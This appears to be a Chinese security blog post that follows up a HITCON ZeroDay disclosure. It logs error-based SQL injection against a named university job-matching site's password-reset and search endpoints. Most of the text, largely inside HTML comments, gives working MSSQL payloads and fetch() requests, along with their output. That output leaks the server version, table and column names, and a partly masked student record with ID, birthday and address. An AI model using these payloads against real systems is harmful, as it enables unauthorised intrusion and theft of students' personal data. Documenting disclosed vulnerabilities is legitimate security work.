---
title: SQL Injection spirit.tku Success
description: SQL Injection spirit.tku Success
last_update:
  date: "2025-09-05T08:00:00+08:00"
---

## 前言

本文是 https://zeroday.hitcon.org/vulnerability/ZD-2025-01095 的延伸

<!-- - 目標網址: http://spirit.tku.edu.tw:8088/job/index.php?qs=zd1czZLoqxC0jMy9qNDMuejh&valid=1
- 目標功能: 忘記密碼
- 實際戳的 API: http://spirit.tku.edu.tw:8088/job/login/main_company_forget_ok.php?c=1
- 注入點為 `c=1` -->

<!-- ## 測試過程

1. `'`

```
string(113) "SQLSTATE[42000]: [Microsoft][SQL Server Native Client 10.0][SQL Server]遺漏字元字串 '';' 後面的引號。"
string(901) "
select Id, Name, ShortName, Code, Address
, Product, Industry, TypeId, Welfare, Web
, Logo, ContactPerson, ContactMobile, ContactPhone, ContactFax
, ContactMail, ContactMailShown, FileName, FilePath, Hit
, CreateTime, ModifyTime, Enabled, Password, LoginTime
, LoginCount, Source, Certificate

, (select Name from Type where Id=A.TypeId) as TypeName
, (select count(*) from Job where CompanyId=A.Id) as JobAllCount
, (select count(*) from Job where CompanyId=A.Id and Enabled=1) as JobEnabledCount
, (select count(*) from Job where CompanyId=A.Id and Enabled=1 and (IsClosed=0 and (ExpiredDate is null or CURRENT_TIMESTAMP < ExpiredDate+1))) as JobValidCount
, (select count(*) from BookmarkCompany where CompanyId=A.Id) as BookmarkCount
, (select count(*) from Send where JobId in (select Id from Job where CompanyId=A.Id and Enabled=1)) as SendCount

from Company A
 where Code=''';"
....
```

2. `123'`

```
string(116) "SQLSTATE[42000]: [Microsoft][SQL Server Native Client 10.0][SQL Server]遺漏字元字串 '123';' 後面的引號。"
string(904) "
select Id, Name, ShortName, Code, Address
, Product, Industry, TypeId, Welfare, Web
, Logo, ContactPerson, ContactMobile, ContactPhone, ContactFax
, ContactMail, ContactMailShown, FileName, FilePath, Hit
, CreateTime, ModifyTime, Enabled, Password, LoginTime
, LoginCount, Source, Certificate

, (select Name from Type where Id=A.TypeId) as TypeName
, (select count(*) from Job where CompanyId=A.Id) as JobAllCount
, (select count(*) from Job where CompanyId=A.Id and Enabled=1) as JobEnabledCount
, (select count(*) from Job where CompanyId=A.Id and Enabled=1 and (IsClosed=0 and (ExpiredDate is null or CURRENT_TIMESTAMP < ExpiredDate+1))) as JobValidCount
, (select count(*) from BookmarkCompany where CompanyId=A.Id) as BookmarkCount
, (select count(*) from Send where JobId in (select Id from Job where CompanyId=A.Id and Enabled=1)) as SendCount

from Company A
 where Code='123'';"
....
```

算起來是 28 + 6 個欄位，並且最後面有個 `;` 結尾

3. `c=' OR '1' = '1`

```html
<meta charset="utf-8" />
<script>
  if (confirm("Q. 是否將貴公司密碼 E-mail 至 xxx@xxxx.com.tw？")) {
    location.href = "main_company_forget_ok.php?i=4";
  }
</script>
```

成功提取到第一個人類的 Email

4. `' AND 1 = CONVERT(int,@@version)--`

```
string(347) "SQLSTATE[22018]: [Microsoft][SQL Server Native Client 10.0][SQL Server]將 nvarchar 值 'Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (Intel X86)
	Apr  2 2010 15:53:02
	Copyright (c) Microsoft Corporation
	Enterprise Edition on Windows NT 5.2 <X86> (Build 3790: Service Pack 2) (Hypervisor)
' 轉換成資料類型 int 時，轉換失敗。"
string(934) "
select Id, Name, ShortName, Code, Address
, Product, Industry, TypeId, Welfare, Web
, Logo, ContactPerson, ContactMobile, ContactPhone, ContactFax
, ContactMail, ContactMailShown, FileName, FilePath, Hit
, CreateTime, ModifyTime, Enabled, Password, LoginTime
, LoginCount, Source, Certificate

, (select Name from Type where Id=A.TypeId) as TypeName
, (select count(*) from Job where CompanyId=A.Id) as JobAllCount
, (select count(*) from Job where CompanyId=A.Id and Enabled=1) as JobEnabledCount
, (select count(*) from Job where CompanyId=A.Id and Enabled=1 and (IsClosed=0 and (ExpiredDate is null or CURRENT_TIMESTAMP < ExpiredDate+1))) as JobValidCount
, (select count(*) from BookmarkCompany where CompanyId=A.Id) as BookmarkCount
, (select count(*) from Send where JobId in (select Id from Job where CompanyId=A.Id and Enabled=1)) as SendCount

from Company A
 where Code='' AND 1 = CONVERT(int,@@version)--';"
....
```

成功提取到 `@@version`

5. `' AND 1 = CONVERT(int,(SELECT table_name FROM information_schema.tables))--`

```
string(220) "SQLSTATE[21000]: [Microsoft][SQL Server Native Client 10.0][SQL Server]子查詢傳回不只 1 個值。這種狀況在子查詢之後有 =、!=、<、<=、>、>= 或是子查詢做為運算式使用時是不允許的。"
string(975) "
select Id, Name, ShortName, Code, Address
, Product, Industry, TypeId, Welfare, Web
, Logo, ContactPerson, ContactMobile, ContactPhone, ContactFax
, ContactMail, ContactMailShown, FileName, FilePath, Hit
, CreateTime, ModifyTime, Enabled, Password, LoginTime
, LoginCount, Source, Certificate

, (select Name from Type where Id=A.TypeId) as TypeName
, (select count(*) from Job where CompanyId=A.Id) as JobAllCount
, (select count(*) from Job where CompanyId=A.Id and Enabled=1) as JobEnabledCount
, (select count(*) from Job where CompanyId=A.Id and Enabled=1 and (IsClosed=0 and (ExpiredDate is null or CURRENT_TIMESTAMP < ExpiredDate+1))) as JobValidCount
, (select count(*) from BookmarkCompany where CompanyId=A.Id) as BookmarkCount
, (select count(*) from Send where JobId in (select Id from Job where CompanyId=A.Id and Enabled=1)) as SendCount

from Company A
 where Code='' AND 1 = CONVERT(int,(SELECT table_name FROM information_schema.tables))--';"
....
```

學習了，所以下一步是要想辦法把 `table_name` 拼接起來，參考 [之前 SQLi MSSQL 的技巧](./sql-injection-wowisee-success.md#學到的東西) 試試看

6. `' AND 1 = CONVERT(int,(SELECT table_name FROM information_schema.tables FOR XML PATH('')))--`

```xml
<table_name>Variables</table_name>
<table_name>College</table_name>
<table_name>Student</table_name>
<table_name>Type</table_name>
<table_name>City</table_name>
<table_name>Send</table_name>
<table_name>Welfare</table_name>
<table_name>Company</table_name>
<table_name>News</table_name>
<table_name>CompanyCity</table_name>
<table_name>CompanyWelfare</table_name>
<table_name>Job</table_name>
<table_name>JobType</table_name>
<table_name>JobCity</table_name>
<table_name>CompanyFromSIS</table_name>
<table_name>Status</table_name>
<table_name>StudentStatus</table_name>
<table_name>StudentCity</table_name>
<table_name>BookmarkJob</table_name>
<table_name>BookmarkCompany</table_name>
```

7. `' AND 1 = CONVERT(int,(SELECT COUNT(*) + 'hello' FROM information_schema.columns WHERE table_name = 'Student' FOR XML PATH('')))--`

```xml
<hello>74</hello>
```

8. `' AND 1 = CONVERT(int,(SELECT column_name FROM information_schema.columns WHERE table_name = 'Student' FOR XML PATH('')))--`

```xml
<column_name>Id</column_name>
<column_name>Code</column_name>
<column_name>Name</column_name>
<column_name>YS</column_name>
<column_name>College</column_name>
<column_name>Department</column_name>
<column_name>Class</column_name>
<column_name>ClassCode</column_name>
<column_name>Role</column_name>
<column_name>IsAlumnus</column_name>
<column_name>IsGraduate</column_name>
<column_name>IsNight</column_name>
<column_name>Gender</column_name>
<column_name>Birthday</column_name>
<column_name>PID</column_name>
<column_name>Photo</column_name>
<column_name>Phone</column_name>
<column_name>Mobile</column_name>
<column_name>Address</column_name>
<column_name>Mail</column_name>
<column_name>SchoolType</column_name>
<column_name>SchoolStatus</column_name>
<column_name>SchoolName</column_name>
<column_name>SchoolDepartment</column_name>
<column_name>SchoolStart</column_name>
<column_name>SchoolEnd</column_name>
<column_name>Duration</column_name>
<column_name>PayType</column_name>
<column_name>Pay</column_name>
<column_name>PayFollow</column_name>
<column_name>JobStatus</column_name>
<column_name>OKTime</column_name>
<column_name>PastCompany1</column_name>
<column_name>PastTitle1</column_name>
<column_name>PastJob1</column_name>
<column_name>PastPay1</column_name>
<column_name>PastStart1</column_name>
<column_name>PastEnd1</column_name>
<column_name>PastLeave1</column_name>
<column_name>PastCompany2</column_name>
<column_name>PastTitle2</column_name>
<column_name>PastJob2</column_name>
<column_name>PastPay2</column_name>
<column_name>PastStart2</column_name>
<column_name>PastEnd2</column_name>
<column_name>PastLeave2</column_name>
<column_name>LangName1</column_name>
<column_name>LangListen1</column_name>
<column_name>LangTalk1</column_name>
<column_name>LangRead1</column_name>
<column_name>LangWrite1</column_name>
<column_name>LangName2</column_name>
<column_name>LangListen2</column_name>
<column_name>LangTalk2</column_name>
<column_name>LangRead2</column_name>
<column_name>LangWrite2</column_name>
<column_name>DriveType</column_name>
<column_name>DriveOther</column_name>
<column_name>TypeChinese</column_name>
<column_name>TypeEnglish</column_name>
<column_name>PC1</column_name>
<column_name>PC2</column_name>
<column_name>PC3</column_name>
<column_name>PC4</column_name>
<column_name>PC5</column_name>
<column_name>PCOther</column_name>
<column_name>Other</column_name>
<column_name>CreateTime</column_name>
<column_name>ModifyTime</column_name>
<column_name>LoginTime</column_name>
<column_name>LoginCount</column_name>
<column_name>Autobiography</column_name>
<column_name>AttachedNote</column_name>
<column_name>AttachedFile</column_name>
```

資料會被截斷，測起來是 400 多字元，就抓一次 440 個，取到 2598 的時候剛好結束

8. `' AND 1 = CONVERT(int,(SELECT SUBSTRING((SELECT column_name as cn FROM information_schema.columns WHERE table_name = 'Student' FOR XML PATH('')),1,440)))--`

```xml
<cn>Code</cn>
```

發現用 `SELECT column_name as cn` 就可以大幅減少重複的 TAG Name，增加提取的效率

9. `' AND 1 = CONVERT(int,(SELECT COUNT(*) + 'hello' FROM Student FOR XML PATH('')))--`

```xml
<hello>2155</hello>
```

10. `' AND 1 = CONVERT(int,(SELECT SUBSTRING((SELECT * FROM Student FOR XML PATH('')),1,440)))--`

```xml
<Id>7</Id>
<Code>40*******</Code>
<Name>孫**</Name>
<YS>1***</YS>
<College>**語文學院</College>
<Department>**語文學系（日）</Department>
<Class>**四</Class>
<ClassCode>T***** </ClassCode>
<Role>學生</Role>
<IsAlumnus>0</IsAlumnus>
<IsGraduate>0</IsGraduate>
<IsNight>0</IsNight>
<Gender>女</Gender>
<Birthday>1998-**-**T00:00:00</Birthday>
<PID>A2********</PID>
<Phone>02-26******</Phone>
<Address>221 新北市汐止區*****巷*弄*號*樓</Address>
<Mail>40*******@***.tku.edu.tw</Mail>
<SchoolType>大專院校</SchoolType>
<SchoolStatus>在學</SchoolStatus>
<SchoolName>淡江大學</SchoolName>
<SchoolDepartment>**語文學系（日）</SchoolDepartment>
<CreateTime>2020-04-01T18:00:37</CreateTime>
<ModifyTime>2020-05-07T16:40:16</ModifyTime>
<LoginTime>2020-05-07T16:40:16</LoginTime>
<LoginCount>2</LoginCount>
``` -->

## 學到的東西

1. 如果 SELECT 的是數字，後面要加一個字串，才可以成功引出 Error Message

```sql
SELECT COUNT(*) + 'hello' FROM Student FOR XML PATH('')
```

2. 用 as 別名，可以大幅減少重複的 XML Tag 長度，提升讀取資料的效率

```sql
SELECT table_name as tn FROM information_schema.tables FOR XML PATH('')
```

<!-- ## 測試過程 2

1. SchoolType

```ts
fetch("http://spirit.tku.edu.tw:8088/job/company/search_data_ok.php", {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: "SchoolType='",
  method: "POST",
  mode: "cors",
  credentials: "omit",
});
```

```
string(109) "SQLSTATE[42000]: [Microsoft][SQL Server Native Client 10.0][SQL Server]接近 ')' 之處的語法不正確。"
string(316) "
```

```sql
select Id
from Job A
 where ()/0.0 >= 0.5
order by (select case IsClosed when 0 then 1 when 1 then 2 end)
		, (select case when ExpiredDate is null then '2100-01-01' else ExpiredDate end) desc
		, (select case when CompanyId=0 then '' else (select ShortName from Company where Id=A.CompanyId) end)
		, Id
		"
....
```

2. PayType

```ts
fetch("http://spirit.tku.edu.tw:8088/job/company/search_data_ok.php", {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: "PayType='",
  method: "POST",
  mode: "cors",
  credentials: "omit",
});
```

```
string(112) "SQLSTATE[42000]: [Microsoft][SQL Server Native Client 10.0][SQL Server]接近 '2100' 之處的語法不正確。"
string(363) "
```

```sql
select Id
from Job A
 where ((select case when PayType=''' then  else 0 end))/0.0 >= 0.5
order by (select case IsClosed when 0 then 1 when 1 then 2 end)
		, (select case when ExpiredDate is null then '2100-01-01' else ExpiredDate end) desc
		, (select case when CompanyId=0 then '' else (select ShortName from Company where Id=A.CompanyId) end)
		, Id
		"
```

3. JobTags1

```ts
fetch("http://spirit.tku.edu.tw:8088/job/company/search_data_ok.php", {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: "JobTags1=1",
  method: "POST",
  mode: "cors",
  credentials: "omit",
});
```

```
string(121) "SQLSTATE[42000]: [Microsoft][SQL Server Native Client 10.0][SQL Server]接近關鍵字 'else' 之處的語法不正確。"
string(362) "
```

```sql
select Id
from Job A
 where ((select case when (IsFull=1) then  else 0 end))/0.0 >= 0.5
order by (select case IsClosed when 0 then 1 when 1 then 2 end)
		, (select case when ExpiredDate is null then '2100-01-01' else ExpiredDate end) desc
		, (select case when CompanyId=0 then '' else (select ShortName from Company where Id=A.CompanyId) end)
		, Id
		"
....
```

4. WorkTimeType

```ts
fetch("http://spirit.tku.edu.tw:8088/job/company/search_data_ok.php", {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: "WorkTimeType='",
  method: "POST",
  mode: "cors",
  credentials: "omit",
});
```

```
string(112) "SQLSTATE[42000]: [Microsoft][SQL Server Native Client 10.0][SQL Server]接近 '2100' 之處的語法不正確。"
string(368) "
```

```sql
select Id
from Job A
 where ((select case when WorkTimeType=''' then  else 0 end))/0.0 >= 0.5
order by (select case IsClosed when 0 then 1 when 1 then 2 end)
		, (select case when ExpiredDate is null then '2100-01-01' else ExpiredDate end) desc
		, (select case when CompanyId=0 then '' else (select ShortName from Company where Id=A.CompanyId) end)
		, Id
		"
....
```

5. PayType 成功

```js
fetch("http://spirit.tku.edu.tw:8088/job/company/search_data_ok.php", {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: `PayType=${encodeURIComponent(`123' then 1 else 0 end))/0.0 >= 0.5 AND 1=CONVERT(int, @@version)--`)}`,
  method: "POST",
  mode: "cors",
  credentials: "omit",
});
```

```
string(347) "SQLSTATE[22018]: [Microsoft][SQL Server Native Client 10.0][SQL Server]將 nvarchar 值 'Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (Intel X86)
Apr 2 2010 15:53:02
Copyright (c) Microsoft Corporation
Enterprise Edition on Windows NT 5.2 <X86> (Build 3790: Service Pack 2) (Hypervisor)
' 轉換成資料類型 int 時，轉換失敗。"
string(429) "
```

```sql
select Id
from Job A
 where ((select case when PayType='123' then 1 else 0 end))/0.0 >= 0.5 AND 1=CONVERT(int, @@version)--' then  else 0 end))/0.0 >= 0.5
order by (select case IsClosed when 0 then 1 when 1 then 2 end)
		, (select case when ExpiredDate is null then '2100-01-01' else ExpiredDate end) desc
		, (select case when CompanyId=0 then '' else (select ShortName from Company where Id=A.CompanyId) end)
		, Id
		"
....
``` -->
